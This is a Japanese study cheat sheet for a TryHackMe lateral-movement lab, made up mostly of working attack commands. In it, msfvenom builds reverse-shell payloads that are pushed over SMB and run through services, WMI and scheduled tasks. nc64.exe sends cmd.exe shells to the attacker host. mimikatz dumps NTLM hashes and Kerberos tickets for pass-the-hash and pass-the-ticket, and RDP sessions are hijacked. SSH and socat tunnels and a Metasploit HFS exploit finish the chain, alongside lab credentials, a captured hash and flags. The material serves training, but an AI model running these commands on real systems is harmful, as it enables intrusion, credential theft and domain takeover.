# Lateral Movement & Pivoting チートシート

> TryHackMe「Lateral Movement and Pivoting」ルーム学習記録  
> 作成日: 2026-04-09

---

## 🌐 ネットワーク構成

```
THMDC (10.200.74.101) - ドメインコントローラー
THMITS (10.200.74.201) - ITサーバー
THMIIS (10.200.74.249) - IISサーバー
THMJMP2 - ジャンプホスト（踏み台）
```

---

## 🔑 認証情報の取得

```
http://distributor.za.tryhackme.com/creds    # 通常の認証情報
http://distributor.za.tryhackme.com/creds_t2 # 管理者権限の認証情報
```

---

## 📡 VPN接続

```bash
sudo openvpn ~/Downloads/<vpnファイル>.ovpn

# KaliのlateralmovementインターフェースのIPを確認
ip a | grep lateralmovement
```

---

## Task 3: プロセスのリモート実行

### Psexec
```bash
# ポート: 445/TCP (SMB)
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### WinRM
```bash
# ポート: 5985/TCP (HTTP) または 5986/TCP (HTTPS)
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

### sc.exe（サービス作成）
```cmd
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

### schtasks（スケジュールタスク）
```cmd
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<コマンド>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1"
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### 今回の手順（sc.exeでリバースシェル）

```bash
# 1. msfvenomでペイロード作成（Kali）
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<KaliのIP> LPORT=4444 -o mori_service.exe

# 2. smbclientでアップロード（Kali）
smbclient -c 'put mori_service.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

# 3. msfconsoleでリスナー起動（Kali）
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <KaliのIP>; set LPORT 4444; exploit"

# 4. ncリスナー起動（Kali）
nc -lvp 4443

# 5. runasで別ユーザーのシェルを起動（THMJMP2）
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe <KaliのIP> 4443"

# 6. sc.exeでサービス作成・起動（ncで取得したシェル内）
sc.exe \\thmiis.za.tryhackme.com create THMservice-mori binPath= "%windir%\mori_service.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-mori
```

**Flag:** `THM{MOVING_WITH_SERVICES}`

---

## Task 4: WMIを使ったLateral Movement

### WMIセッション確立（PowerShell）
```powershell
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

### MSIパッケージでリバースシェル

```bash
# 1. MSIペイロード作成（Kali）
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KaliのIP> LPORT=4445 -f msi -o mori_installer.msi

# 2. smbclientでアップロード（Kali）
smbclient -c 'put mori_installer.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994

# 3. msfconsoleでリスナー起動（Kali）
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <KaliのIP>; set LPORT 4445; exploit"

# 4. WMI経由でMSIをインストール（THMJMP2 PowerShell）
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\mori_installer.msi"; Options = ""; AllUsers = $false}
```

**Flag:** `THM{MOVING_WITH_WMI_4_FUN}`

---

## Task 5: 代替認証情報の使用

### NTLM認証の仕組み
1. クライアントが認証リクエストを送信
2. サーバーがチャレンジ（乱数）を送信
3. クライアントがNTLMハッシュ+チャレンジでレスポンスを生成
4. DCが検証して認証結果を返す

### Pass-the-Hash (PtH)

```
# mimikatzでNTLMハッシュを取得
mimikatz # privilege::debug
mimikatz # sekurlsa::msv

# PtHでリバースシェルを起動
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:<NTLMハッシュ> /run:"c:\tools\nc64.exe -e cmd.exe <KaliのIP> 5555"
```

### Linuxからのオプション
```bash
# RDP経由
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

# psexec経由
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

# WinRM経由
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

### Pass-the-Ticket (PtT)
```
# チケットをエクスポート
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# チケットをインジェクト
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

### Overpass-the-Hash / Pass-the-Key (PtK)
```
# Kerberosキーを取得
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys

# RC4ハッシュでTGTを取得してシェルを起動
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:<RC4ハッシュ> /run:"c:\tools\nc64.exe -e cmd.exe <KaliのIP> 5556"
```

### 今回の手順

```bash
# 1. Kaliでncリスナー起動
nc -lvp 5555

# 2. mimikatzでPtH実行（THMJMP2）
mimikatz # privilege::debug
mimikatz # sekurlsa::msv
# → t1_toby.beck の NTLM: 533f1bd576caa912bdb9da284bbc60fe を取得

mimikatz # token::revert
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe <KaliのIP> 5555"

# 3. ncシェルからwinrsでTHMIISに接続
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

**Flag:** `THM{NO_PASSWORD_NEEDED}`

---

## Task 6: ユーザー行動の悪用

### RDP Hijacking

```cmd
# 1. PsExec64でSYSTEM権限のシェルを取得
c:\tools\PsExec64.exe -s cmd.exe

# 2. セッション一覧を確認
query session

# 3. Disc状態のセッションをハイジャック
tscon <セッションID> /dest:<自分のSESSIONNAME>
```

### 注意事項
- **Disc（切断）状態**のセッションを選ぶ（アクティブセッションは相手に気づかれる）
- Windows Server 2019以降はパスワードなしではハイジャックできない

**Flag:** `THM{NICE_WALLPAPER}`

---

## Task 7: ポートフォワーディング

### SSH Remote Port Forwarding
```cmd
# PC-1からAttacker PCへSSHトンネル
# ServerのポートをAttacker PCに転送
ssh tunneluser@<AttackerIP> -R <AttackerPort>:<ServerIP>:<ServerPort> -N
```

### SSH Local Port Forwarding
```cmd
# Attacker PCのポートをPC-1に転送
ssh tunneluser@<AttackerIP> -L *:<PC1Port>:127.0.0.1:<AttackerPort> -N
```

### socatによるポートフォワーディング
```cmd
# PC-1でServerのポートを転送
socat TCP4-LISTEN:<ListenPort>,fork TCP4:<ServerIP>:<ServerPort>
```

### Dynamic Port Forwarding（SOCKSプロキシ）
```cmd
ssh tunneluser@<AttackerIP> -R 9050 -N
# Kaliでproxychainsを使用
proxychains curl http://target.com
```

### 今回の手順

#### Q1: socatでRDP転送
```bash
# THMJMP2でsocat起動
c:\tools\socat\socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389

# KaliからRDP接続
xfreerdp /v:thmjmp2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

**Flag:** `THM{SIGHT_BEYOND_SIGHT}`

#### Q2: SSHトンネル + Rejetto HFS Exploit
```bash
# 1. Kaliでtunneluserを作成
sudo useradd tunneluser -m -d /home/tunneluser -s /bin/true
sudo passwd tunneluser
sudo systemctl start ssh

# 2. THMJMP2からSSHトンネルを設定
ssh tunneluser@<KaliのIP> -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N

# 3. msfconsoleでRejetto HFS exploitを実行（Kali）
msfconsole -q
use rejetto_hfs_exec
set payload windows/shell_reverse_tcp
set lhost thmjmp2.za.tryhackme.com
set ReverseListenerBindAddress 127.0.0.1
set lport 7878
set srvhost 127.0.0.1
set srvport 6666
set rhosts 127.0.0.1
set rport 8888
exploit

# 4. flagを取得
type C:\hfs\flag.txt
```

**Flag:** `THM{FORWARDING_IT_ALL}`

---

## 🔧 よく使うツール

| ツール | 用途 |
|---|---|
| `mimikatz` | 認証情報の抽出（NTLM、Kerberosチケット） |
| `msfvenom` | ペイロード作成 |
| `msfconsole` | Metasploitフレームワーク |
| `smbclient` | SMB共有へのファイル転送 |
| `socat` | ポートフォワーディング |
| `nc / nc64.exe` | リバースシェルのリスナー |
| `PsExec64.exe` | リモートプロセス実行・SYSTEM権限取得 |
| `winrs.exe` | WinRMでリモートコマンド実行 |
| `xfreerdp` | LinuxからのRDP接続 |
| `proxychains` | SOCKSプロキシ経由でのコマンド実行 |

---

## 📚 Lateral Movementの手法まとめ

| 手法 | プロトコル | ポート | 必要権限 |
|---|---|---|---|
| Psexec | SMB | 445 | Administrators |
| WinRM | HTTP/HTTPS | 5985/5986 | Remote Management Users |
| sc.exe | RPC/SMB | 135,445,139 | Administrators |
| schtasks | RPC/SMB | 135,445,139 | Administrators |
| WMI | RPC/WinRM | 135,5985/5986 | Administrators |
| RDP Hijacking | RDP | 3389 | SYSTEM |
| Pass-the-Hash | 各種 | 各種 | 有効なNTLMハッシュ |
| Pass-the-Ticket | Kerberos | 88 | チケットへのアクセス |

---

## 📚 参考リンク

- GTFOBins: https://gtfobins.github.io
- TryHackMe: https://tryhackme.com
- Mimikatz: https://github.com/gentilkiwi/mimikatz
